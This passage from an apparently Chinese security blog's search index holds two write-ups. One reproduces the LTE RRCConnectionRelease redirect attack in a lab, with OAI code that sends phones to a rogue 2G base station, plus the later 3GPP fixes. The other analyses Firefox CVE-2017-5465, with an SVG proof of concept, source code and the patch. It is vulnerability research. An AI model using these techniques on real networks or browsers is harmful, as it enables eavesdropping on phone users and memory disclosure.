E00;&#x4E9B;&#x6D88;&#x606F;&#x2026;&#x2026;</p><h2 id="&#x5176;&#x4ED6;"><a href="#&#x5176;&#x4ED6;" class="headerlink" title="&#x5176;&#x4ED6;"></a>&#x5176;&#x4ED6;</h2><p>&#x2026;&#x2026;</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 5G </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LTE RRCConnectionRelease Redirect问题分析</title>
      <link href="/2020/09/23/RRCConnectionRelease/"/>
      <url>/2020/09/23/RRCConnectionRelease/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#x5728;16&#x5E74;&#x88AB;&#x56FD;&#x5185;&#x7814;&#x7A76;&#x5458;&#x53D1;&#x73B0;&#x63D0;&#x51FA;&#xFF0C;&#x5E76;&#x5B9E;&#x73B0;&#x4E86;&#x5B8C;&#x6574;&#x7684;&#x653B;&#x51FB;&#x3002;&#x56E0;&#x4E3A;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x7ECF;&#x5178;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x5B66;&#x4E60;LTE/5G&#x5B89;&#x5168;&#x8FC7;&#x7A0B;&#x4E2D;&#x590D;&#x73B0;&#x4E00;&#x4E0B;&#x4E5F;&#x662F;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x7684;&#x3002;&#x6211;&#x5927;&#x6982;&#x662F;&#x5728;&#x4ECA;&#x5E74;&#x521D;&#x5206;&#x6790;&#x590D;&#x73B0;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x3002;</p><p><strong>RRCConnectionRelease</strong>&#x5728;5GNR&#x4E2D;&#x662F;<strong>RRCRelease</strong>.</p><p><strong>RRCConnectionRelease</strong>&#x6B63;&#x5E38;&#x7684;&#x4F7F;&#x7528;&#x662F;&#xFF1A;</p><p><img src="/images/RRCConnectionRelease.assets/image-20200922211501652-1600956721344.png" alt="image-20200922211501652"></p><p>&#x7531;&#x57FA;&#x7AD9;&#x53D1;&#x7ED9;UE&#xFF0C;&#x4F5C;&#x7528;&#x5305;&#x62EC;&#x91CA;&#x653E;&#x4E00;&#x4E2A;rrc connection&#x2026;</p><h2 id="&#x57FA;&#x672C;&#x539F;&#x7406;"><a href="#&#x57FA;&#x672C;&#x539F;&#x7406;" class="headerlink" title="&#x57FA;&#x672C;&#x539F;&#x7406;"></a>&#x57FA;&#x672C;&#x539F;&#x7406;</h2><p>&#x5F53;&#x5728;nas&#x5C42;reject&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x540E;&#xFF0C;ue&#x63A5;&#x6536;&#x540E;&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;&#x57FA;&#x7AD9;&#x53D1;&#x9001;rrcconnectionrelease&#x7ED9;UE&#xFF0C;&#x6B64;&#x65F6;UE&#x4F1A;&#x5BF9;rrcconnectionrelease&#x5305;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x56E0;&#x4E3A;&#x672C;&#x8EAB;&#x4E5F;&#x662F;&#x8FDE;&#x63A5;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x624D;&#x4F1A;&#x89E6;&#x53D1;rrcconnectionrelease&#xFF0C;&#x5373;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x5C31;&#x662F;&#x57FA;&#x7AD9;&#x5C42;&#x4E22;&#x5931;&#x4E86;&#x4E00;&#x5F00;&#x59CB;&#x6CE8;&#x518C;&#x5165;&#x7F51;&#x7684;key&#x7B49;&#x4FE1;&#x606F;&#x3002;&#x56E0;&#x6B64;&#x534F;&#x8BAE;&#x4E0A;&#x6700;&#x5F00;&#x59CB;&#x7684;&#x63CF;&#x8FF0;&#xFF0C;UE&#x63A5;&#x6536;&#x540E;&#x5E76;&#x4E0D;&#x4F1A;&#x5BF9;rrcconnectionrelease&#x7684;&#x5B8C;&#x6574;&#x6027;&#x8FDB;&#x884C;&#x6821;&#x9A8C;&#xFF0C;&#x800C;&#x76F4;&#x63A5;&#x63A5;&#x6536;&#x89E3;&#x6790;&#x3002;</p><p>&#x5728;rrcconnectionrelease&#x4E2D;&#x53EF;&#x4EE5;&#x643A;&#x5E26;redirectedCarrierInfo&#x7ED3;&#x6784;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x67E5;&#x770B;asn&#x6587;&#x4EF6;&#x4E2D;&#x5BF9;&#x8BE5;&#x7ED3;&#x6784;&#x7684;&#x5B9A;&#x4E49;&#xFF1A;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LTE_RRCConnectionRelease_r8_IEs</span> {</span></span><br><span class="line">LTE_ReleaseCause_t releaseCause;</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LTE_RedirectedCarrierInfo</span>*<span class="hljs-title">redirectedCarrierInfo</span>;</span><span class="hljs-comment">/* OPTIONAL */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LTE_IdleModeMobilityControlInfo</span>*<span class="hljs-title">idleModeMobilityControlInfo</span>;</span><span class="hljs-comment">/* OPTIONAL */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LTE_RRCConnectionRelease_v890_IEs</span>*<span class="hljs-title">nonCriticalExtension</span>;</span><span class="hljs-comment">/* OPTIONAL */</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/* Context for parsing across buffer boundaries */</span></span><br><span class="line"><span class="hljs-keyword">asn_struct_ctx_t</span> _asn_ctx;</span><br><span class="line">} LTE_RRCConnectionRelease_r8_IEs_t;</span><br><span class="line"><span class="hljs-comment">//////</span></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> LTE_RedirectedCarrierInfo_PR {</span><br><span class="line">LTE_RedirectedCarrierInfo_PR_NOTHING,<span class="hljs-comment">/* No components present */</span></span><br><span class="line">LTE_RedirectedCarrierInfo_PR_eutra,</span><br><span class="line">LTE_RedirectedCarrierInfo_PR_geran,</span><br><span class="line">LTE_RedirectedCarrierInfo_PR_utra_FDD,</span><br><span class="line">LTE_RedirectedCarrierInfo_PR_utra_TDD,</span><br><span class="line">LTE_RedirectedCarrierInfo_PR_cdma2000_HRPD,</span><br><span class="line">LTE_RedirectedCarrierInfo_PR_cdma2000_1xRTT,</span><br><span class="line"><span class="hljs-comment">/* Extensions may appear below */</span></span><br><span class="line">LTE_RedirectedCarrierInfo_PR_utra_TDD_r10,</span><br><span class="line">LTE_RedirectedCarrierInfo_PR_nr_r15</span><br><span class="line">} LTE_RedirectedCarrierInfo_PR;</span><br><span class="line"><span class="hljs-comment">//////</span></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LTE_RedirectedCarrierInfo</span> {</span></span><br><span class="line">LTE_RedirectedCarrierInfo_PR present;</span><br><span class="line"><span class="hljs-keyword">union</span> LTE_RedirectedCarrierInfo_u {</span><br><span class="line">LTE_ARFCN_ValueEUTRA_t eutra;</span><br><span class="line">LTE_CarrierFreqsGERAN_t geran;</span><br><span class="line">LTE_ARFCN_ValueUTRA_t utra_FDD;</span><br><span class="line">LTE_ARFCN_ValueUTRA_t utra_TDD;</span><br><span class="line">LTE_CarrierFreqCDMA2000_t cdma2000_HRPD;</span><br><span class="line">LTE_CarrierFreqCDMA2000_t cdma2000_1xRTT;</span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * This type is extensible,</span></span><br><span class="line"><span class="hljs-comment"> * possible extensions are below.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line">LTE_CarrierFreqListUTRA_TDD_r10_t utra_TDD_r10;</span><br><span class="line">LTE_CarrierInfoNR_r15_t nr_r15;</span><br><span class="line">} choice;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/* Context for parsing across buffer boundaries */</span></span><br><span class="line"><span class="hljs-keyword">asn_struct_ctx_t</span> _asn_ctx;</span><br><span class="line">} LTE_RedirectedCarrierInfo_t;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x53D1;&#x73B0;redirectedCarrierInfo&#x5176;&#x5B9E;&#x662F;&#x7ED9;UE&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;/&#x591A;&#x4E2A;&#x53EF;&#x9009;&#x7684;&#x9891;&#x7387;/&#x9891;&#x9053;/arfcn&#x3002;&#x5F53;UE&#x6536;&#x5230;&#x540E;&#x4F1A;&#x6839;&#x636E;&#x8BE5;&#x4FE1;&#x606F;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x5408;&#x9002;&#x7684;cell&#x3002;(The procedure can also be used to release and redirect a UE to another frequency)</p><h2 id="&#x73AF;&#x5883;"><a href="#&#x73AF;&#x5883;" class="headerlink" title="&#x73AF;&#x5883;"></a>&#x73AF;&#x5883;</h2><p>&#x4E0D;&#x5F71;&#x54CD;&#x73B0;&#x7F51;&#xFF0C;&#x56E0;&#x6B64;&#x7528;oai&#x548C;openair-cn&#x642D;&#x5EFA;&#x4E00;&#x4E2A;LTE&#x7F51;&#x3002;&#x7528;&#x6B63;&#x5E38;&#x624B;&#x673A;(UE)&#x8FDE;&#x63A5;&#x3002;&#xFF08;USRP B210+&#x7B14;&#x8BB0;&#x672C;&#xFF09;</p><p>&#x9009;&#x7528;&#x7684;&#x662F;&#x901A;&#x8FC7;&#x6838;&#x5FC3;&#x7F51;/MME&#x53D1;&#x9001;&#x7684;attach reject&#x6765;&#x89E6;&#x53D1;&#x57FA;&#x7AD9;&#x7684;RRCConnectionRelease.</p><p>&#x521D;&#x59CB;&#x72B6;&#x6001;&#x7684;&#x6D4B;&#x8BD5;&#xFF0C;attach reject&#x9009;&#x7528;cause 17&#xFF0C;network failure&#xFF0C;&#x6BD4;&#x8F83;&#x201C;&#x5F31;&#x201D;&#x7684;&#x4E00;&#x4E2A;cause&#x3002;</p><p>oai&#x4EE3;&#x7801;&#x4E0D;&#x52A8;&#xFF0C;&#x9ED8;&#x8BA4;RRCConnectionRelease&#x4E2D;&#x662F;&#x4E0D;&#x643A;&#x5E26;redirectedCarrierInfo&#x3002;&#x4FEE;&#x6539;openair-cn&#xFF0C;&#x5F53;&#x63A5;&#x6536;&#x5230;&#x7B2C;&#x4E00;&#x6B21;attach request&#x65F6;&#x5019;&#xFF0C;&#x53D1;&#x9001;attach reject&#xFF0C;cause 17&#xFF1B;&#x800C;&#x7B2C;&#x4E8C;&#x6B21;&#x5C06;&#x6B63;&#x5E38;&#x5904;&#x7406;attach request(&#x5373;accept)&#x3002;</p><p>&#x642D;&#x5EFA;&#x4E00;&#x4E2A;2G&#x73AF;&#x5883;&#xFF0C;&#x4FDD;&#x6301;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x3002;&#xFF08;&#x4E00;&#x4E2A;Linux&#x865A;&#x62DF;&#x673A;+limesdr mini&#xFF09;</p><p><strong>&#x73B0;&#x8C61;</strong>&#xFF1A;UE&#x5728;&#x7B2C;&#x4E00;&#x6B21;attach reject&#x4E4B;&#x540E;&#xFF0C;&#x7EE7;&#x7EED;&#x5411;LTE&#x7F51;&#x7EDC;&#x53D1;&#x8D77;attach request&#xFF0C;&#x7136;&#x540E;&#x6B63;&#x5E38;&#x8FDE;&#x63A5;LTE&#x7F51;&#x7EDC;&#x3002;</p><h2 id="&#x6DFB;&#x52A0;redirectedCarrierInfo"><a href="#&#x6DFB;&#x52A0;redirectedCarrierInfo" class="headerlink" title="&#x6DFB;&#x52A0;redirectedCarrierInfo"></a>&#x6DFB;&#x52A0;redirectedCarrierInfo</h2><p>oai&#x5728;asn1_msg.c&#x4E2D;&#xFF0C;do_RRCConnectionRelease&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x662F;&#x7528;&#x6765;&#x6784;&#x9020;RRCConnectionRelease&#x5305;&#xFF0C;&#x6DFB;&#x52A0;redirectedCarrierInfo&#x7ED3;&#x6784;&#x3002;&#x6BD4;&#x5982;&#x6211;&#x7684;&#x6DFB;&#x52A0;&#xFF1A;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LTE_RedirectedCarrierInfo_t rInfo;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-comment">// geran</span></span><br><span class="line">  rInfo.present = LTE_RedirectedCarrierInfo_PR_geran;</span><br><span class="line">  LTE_CarrierFreqsGERAN_t cfgt;</span><br><span class="line">  cfgt.startingARFCN = <span class="hljs-number">636</span>;</span><br><span class="line">  cfgt.bandIndicator = <span class="hljs-number">0</span>;</span><br><span class="line">  cfgt.followingARFCNs.present = LTE_CarrierFreqsGERAN__followingARFCNs_PR_equallySpacedARFCNs;</span><br><span class="line">  cfgt.followingARFCNs.choice.equallySpacedARFCNs.arfcn_Spacing = <span class="hljs-number">1</span>;</span><br><span class="line">  cfgt.followingARFCNs.choice.equallySpacedARFCNs.numberOfFollowingARFCNs = <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line">  rInfo.choice.geran = cfgt;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">  rrcConnectionRelease-&gt;criticalExtensions.choice.c1.choice.rrcConnectionRelease_r8.redirectedCarrierInfo = &amp;rInfo;</span><br></pre></td></tr></tbody></table></figure><p></p><p>arfcn&#x548C;&#x9891;&#x7387;&#x5BF9;&#x5E94;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF0C;&#x4FDD;&#x6301;&#x548C;&#x4F60;&#x642D;&#x5EFA;&#x7684;&#x4F2A;&#x57FA;&#x7AD9;&#x4E00;&#x81F4;&#x5373;&#x53EF;&#xFF1A;</p><p><a href="https://wenku.baidu.com/view/55e2d6677cd184254a35355b.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/55e2d6677cd184254a35355b.html</a></p><p>&#x73B0;&#x8C61;&#x662F;&#x5728;&#x4E00;&#x6B21;attach reject&#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x8FDE;&#x63A5;&#x5230;&#x4E86;&#x642D;&#x5EFA;&#x7684;2G&#x4F2A;&#x57FA;&#x7AD9;&#x4E0A;&#x3002;</p><h2 id="&#x540E;&#x7EED;"><a href="#&#x540E;&#x7EED;" class="headerlink" title="&#x540E;&#x7EED;"></a>&#x540E;&#x7EED;</h2><p>&#x5F88;&#x65E9;&#x5C31;&#x53D1;&#x73B0;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4F46;3GPP&#x534F;&#x8BAE;&#x6587;&#x6863;&#x5374;&#x5F88;&#x665A;&#x624D;&#x4F53;&#x73B0;&#x6DFB;&#x52A0;&#x4FEE;&#x590D;&#x3002;&#x6D4B;&#x8BD5;&#x7528;&#x7684;&#x4E00;&#x6B3E;19&#x5E74;&#x5E95;&#x7684;&#x624B;&#x673A;&#x4E5F;&#x662F;&#x53D7;&#x5F71;&#x54CD;&#x7684;&#x3002;</p><p>&#x5F53;UE&#x6536;&#x5230;RCCConnectionRelease/RRCRelease&#x65F6;&#xFF0C;&#x5904;&#x7406;&#x6D41;&#x7A0B;&#x4E0A;36331&#x548C;38331&#x90FD;&#x6709;&#x76F8;&#x5173;&#x4FEE;&#x6539;&#x3002;&#x6BD4;&#x5982;36331&#x63CF;&#x8FF0;&#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight tex hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&gt;if the RRCConnectionRelease message includes redirectedCarrierInfo indicating redirection to geran:</span><br><span class="line">    2&gt;if AS security has not been activated, and </span><br><span class="line">    2&gt;if upper layers indicate that redirect to GERAN without AS security is not allowed:</span><br><span class="line">        3&gt;perform the actions upon leaving RRC_CONNECTED as specified in 5.3.12, with release cause &apos;other&apos;, upon which the procedure ends;</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight tex hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&gt; if the RRCConnectionRelease message includes redirectedCarrierInfo indicating redirection to geran; or</span><br><span class="line">1&gt; if the RRCConnectionRelease message includes idleModeMobilityControlInfo including freqPriorityListGERAN:</span><br><span class="line">    2&gt; if AS security has not been activated; and</span><br><span class="line">    2&gt; if upper layers indicate that redirect to GERAN without AS security is not allowed:</span><br><span class="line">        3&gt; ignore the content of the RRCConnectionRelease;</span><br><span class="line">        3&gt; perform the actions upon leaving RRC_CONNECTED or RRC_INACTIVE as specified in 5.3.12, with release cause &apos;other&apos;, upon which the procedure ends;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x63CF;&#x8FF0;&#x4E2D;&#x5728;AS Security&#x4E4B;&#x540E;&#x5FC5;&#x987B;&#x5F97;&#x6709;&#x5B8C;&#x6574;&#x6027;&#x4FDD;&#x62A4;&#xFF1B;&#x5982;&#x679C;&#x5728;AS Security&#x4E4B;&#x524D;&#x7684;&#x8BDD;&#xFF0C;&#x643A;&#x5E26;redirectedCarrierInfo&#x5B57;&#x6BB5;&#x662F;&#x4E0D;&#x4F1A;&#x88AB;&#x5904;&#x7406;&#x7684;&#x3002;&#x5176;&#x5B9E;&#x4E5F;&#x8FD8;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x4E2A;&#x6761;&#x4EF6;<strong>if upper layers indicate that redirect to GERAN</strong> &#x6240;&#x4EE5;&#x548C;&#x57FA;&#x5E26;&#x7684;&#x5B9E;&#x73B0;&#x4E5F;&#x6709;&#x5F88;&#x5927;&#x5173;&#x7CFB;&#x3002;</p><p>&#x800C;&#x5728;38331&#x4E2D;&#xFF0C;&#x5230;&#x4E86;release 15.6.0&#xFF08;19&#x5E74;6&#x6708;&#xFF09;&#x624D;&#x989D;&#x5916;&#x6DFB;&#x52A0;&#x4E00;&#x53E5;ignore&#xFF1A;</p><p></p><figure class="highlight tex hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&gt; if the AS security is not activated:</span><br><span class="line">    2&gt; ignore any field included in RRCRelease message except waitTime;</span><br><span class="line">    2&gt; perform the actions upon going to RRC_IDLE as specified in 5.3.11 with the release cause &apos;other&apos; upon which the procedure ends;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x76F8;&#x5173;&#x6587;&#x6863;&#x53C2;&#x8003;"><a href="#&#x76F8;&#x5173;&#x6587;&#x6863;&#x53C2;&#x8003;" class="headerlink" title="&#x76F8;&#x5173;&#x6587;&#x6863;&#x53C2;&#x8003;"></a>&#x76F8;&#x5173;&#x6587;&#x6863;&#x53C2;&#x8003;</h2><p>Forcing a Targeted LTE Cellphone into an Eavesdropping Network</p><p>seeker: &#x4F2A;&#x57FA;&#x7AD9;&#x9AD8;&#x7EA7;&#x5229;&#x7528;&#x6280;&#x672F;&#x2014;&#x2014;&#x5F7B;&#x5E95;&#x653B;&#x7834;&#x77ED;&#x4FE1;&#x9A8C;&#x8BC1;&#x7801;<br>[1] LTE RRC: TS 36331<br>[2] 5G RRC: TS 38331</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 5G </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-5465 Firefox ConvolvePixel 函数内越界读</title>
      <link href="/2018/04/07/CVE-2017-5465/"/>
      <url>/2018/04/07/CVE-2017-5465/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="&#x57FA;&#x672C;&#x4FE1;&#x606F;"><a href="#&#x57FA;&#x672C;&#x4FE1;&#x606F;" class="headerlink" title="&#x57FA;&#x672C;&#x4FE1;&#x606F;"></a>&#x57FA;&#x672C;&#x4FE1;&#x606F;</h2><ul><li>SVG&#x76F8;&#x5173;&#x6F0F;&#x6D1E;</li><li>&#x53D1;&#x73B0;&#x8005;&#xFF1A;ifratric  (Project Zero) </li></ul><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">&quot;url(#f)&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;f&quot;</span> <span class="hljs-attr">filterRes</span>=<span class="hljs-string">&quot;19&quot;</span> <span class="hljs-attr">filterUnits</span>=<span class="hljs-string">&quot;userSpaceOnUse&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">feConvolveMatrix</span> <span class="hljs-attr">kernelMatrix</span>=<span class="hljs-string">&quot;1 1 1 1 1 1 1 1 1&quot;</span> <span class="hljs-attr">kernelUnitLength</span>=<span class="hljs-string">&quot;1 -1&quot;</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>feConvolveMatrix</code>&#x662F;SVG&#x7684;&#x4E00;&#x4E2A;&#x6EE4;&#x955C;&#x5143;&#x7D20;&#xFF0C;&#x8BBE;&#x7F6E;&#x6EE4;&#x955C;&#x7684;&#x4E00;&#x4E9B;&#x6548;&#x679C;&#x3002;<code>filter</code>&#x6807;&#x7B7E;&#x7528;&#x6765;&#x5B9A;&#x4E49;&#x6EE4;&#x955C;</p><p>&#x56FE;&#x5F62;&#x5143;&#x7D20;&#x5BF9;&#x6EE4;&#x955C;&#x7684;&#x5F15;&#x7528;&#xFF0C;&#x7ED9;&#x56FE;&#x5F62;&#x6DFB;&#x52A0;&#x6EE4;&#x955C;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;xxx.jpg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;400&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500&quot;</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">&quot;url(#f)&quot;</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x51FA;&#x9519;&#x7684;&#x70B9;&#x5728;&#x4E8E;<code>feConvolveMatrix</code>&#x5143;&#x7D20;&#x4E2D;&#x7684;<code>kernelUnitLength</code>&#x5C5E;&#x6027;&#x503C;&#x7684;&#x5904;&#x7406;&#x3002;<br><code>kernelUnitLength</code> in W3C:</p><blockquote><p>The first number is the <dx> value. The second number is the <dy> value.<br>    A negative or zero value is an error</dy></dx></p></blockquote><p>&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;&#x4E3A;<code>1 1</code><br></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Size</span><br><span class="line">nsSVGFE::GetKernelUnitLength(nsSVGFilterInstance* aInstance,</span><br><span class="line">                             nsSVGNumberPair *aKernelUnitLength)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">if</span> (!aKernelUnitLength-&gt;IsExplicitlySet()) {</span><br><span class="line">    <span class="hljs-keyword">return</span> Size(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// &#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;&#x4E3A;(1, 1)</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">float</span> kernelX = aInstance-&gt;GetPrimitiveNumber(SVGContentUtils::X,</span><br><span class="line">                                                aKernelUnitLength,</span><br><span class="line">                                                nsSVGNumberPair::eFirst);</span><br><span class="line">  <span class="hljs-keyword">float</span> kernelY = aInstance-&gt;GetPrimitiveNumber(SVGContentUtils::Y,</span><br><span class="line">                                                aKernelUnitLength,</span><br><span class="line">                                                nsSVGNumberPair::eSecond);</span><br><span class="line">  <span class="hljs-keyword">return</span> Size(kernelX, kernelY);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x56E0;&#x4E3A;&#x9ED8;&#x8BA4; <code>kernelUnitLength</code> &#x6307;&#x5B9A;&#x4E3A;&#x6B63;&#x6570;&#xFF0C;&#x800C;Firefox&#x7F3A;&#x5C11;&#x5BF9;<code>kernelUnitLength</code>&#x4E2D;&#x7684;&#x503C;&#x68C0;&#x67E5;&#xFF0C;&#x5F53;&#x4F20;&#x5165;&#x8D1F;&#x6570;(&#x6CA1;&#x6709;&#x4ED4;&#x7EC6;&#x53BB;&#x5206;&#x6790;&#x5927;&#x5C0F;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;0&#x6216;&#x8005;&#x4E5F;&#x53EF;&#x4EE5;&#x5BFC;&#x81F4;&#x8D8A;&#x754C;&#xFF1F;)&#x65F6;&#xFF0C;&#x5BFC;&#x81F4;&#x6570;&#x7EC4;&#x5206;&#x914D;&#x8FC7;&#x5C0F;&#xFF0C;&#x4ECE;&#x800C;&#x5728;&#x6E32;&#x67D3;&#x65F6;&#x8FDB;&#x884C;&#x6570;&#x7EC4;&#x64CD;&#x4F5C;&#x65F6;&#x6240;&#x8BBF;&#x95EE;&#x7684;&#x4F4D;&#x7F6E;&#x5927;&#x4E8E;&#x6570;&#x7EC4;&#x5206;&#x914D;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x8D8A;&#x754C;&#x8BFB;&#x3002;</p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><img src="/images/CVE-2017-5465/patch.PNG" alt="patch"></p><p>&#x8865;&#x4E01;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x76F4;&#x63A5;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#xFF0C;&#x8FC7;&#x6EE4;&#x6389;&#x975E;&#x6B63;&#x6570;&#x7684;&#x4F20;&#x5165;&#x3002;</p><h2 id="GetPrimitiveDescription"><a href="#GetPrimitiveDescription" class="headerlink" title="GetPrimitiveDescription"></a>GetPrimitiveDescription</h2><p>&#x4ECE;Patch&#x5165;&#x624B;&#xFF0C;&#x5728;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6837;&#x672C;&#x540E;&#xFF0C;<br>&#x9996;&#x5148;&#x662F;&#x4ECE;DOM&#x6811;&#x7684;&#x6784;&#x5EFA;&#x8FC7;&#x7A0B;&#xFF0C;&#x5C06;&#x9700;&#x8981;&#x83B7;&#x53D6;&#x5143;&#x7D20;&#x6240;&#x53EF;&#x80FD;&#x7684;&#x5C5E;&#x6027;&#x4EE5;&#x53CA;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x3002;&#x8FD9;&#x91CC;&#x5BF9;&#x5E94;&#x7684;&#x6EE4;&#x955C;&#x5143;&#x7D20;<code>feConvolveMatrix</code>&#xFF0C;&#x800C;&#x5B83;&#x7684;&#x5904;&#x7406;&#x63A5;&#x53E3;&#x4E3A;<code>SVGFEConvolveMatrixElement.cpp</code>&#xFF0C;&#x56E0;&#x6B64;&#x5BF9;&#x5E94;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;<br></p><figure class="highlight cpp hljs"><table><tbody><tr><td 